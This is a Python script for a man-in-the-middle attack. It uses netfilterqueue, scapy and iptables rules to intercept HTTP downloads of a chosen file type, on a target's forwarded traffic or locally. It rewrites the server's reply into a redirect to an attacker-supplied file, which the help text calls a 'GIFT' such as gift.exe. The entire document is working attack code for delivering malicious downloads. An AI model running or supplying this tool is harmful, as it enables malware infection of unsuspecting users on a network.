import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse


def get_arguments():
    parser = argparse.ArgumentParser(description='Change Download link into your GIFT')
    parser.add_argument('-f' ,  '--format' , dest='format' , nargs='?' , help='Downlaod file format , e.g : exe , rar , jpg , png , pdf ...' , required=True)
    parser.add_argument('-l' ,  '--link'   , dest='link'   , nargs='?' , help='Link Redirect to , e.g : http://127.0.0.1/gift.exe' , required=True)
    parser.add_argument('--local', dest='local', action='store_const', const=True , help='Spoof in your Computer , default=target')
    args = parser.parse_args()
    return args


arr = []
def change_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer('Raw'):
        if scapy_packet[scapy.TCP].dport == 80:
            if result.format in str(scapy_packet['Raw'].load):
                print('HTTP REQUEST')
                print(scapy_packet.show())
                arr.append(scapy_packet['TCP'].ack)
        if scapy_packet[scapy.TCP].sport == 80:
            if  scapy_packet['TCP'].seq in arr:
                print('HTTP RESPONSE')
                arr.clear()
                form = f"HTTP/1.1 301 Moved Permanently\nLocation: http://{result.link}\n\n"
                scapy_packet['Raw'].load = form

                del scapy_packet['IP'].chksum
                del scapy_packet['IP'].len
                del scapy_packet['TCP'].chksum
                packet.set_payload(bytes(scapy_packet))
                  
                print(scapy_packet.show())
                
                

    packet.accept()
    

def process():
    if result.local:
        commandone = 'iptables -I OUTPUT -j NFQUEUE --queue-num 0'
        commandtwo = 'iptables -I INPUT -j NFQUEUE --queue-num 0'
        subprocess.run([commandone] , shell=True)
        subprocess.run([commandtwo] , shell=True)
    else:
        command = 'iptables -I FORWARD -j NFQUEUE --queue-num 0'
        subprocess.run([command] , shell=True)

    try:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0 , change_packet)
        queue.run()
    except:
        command = 'iptables --flush'
        subprocess.run([command] , shell=True)

result = get_arguments()
result.format = '.' + result.format
process()

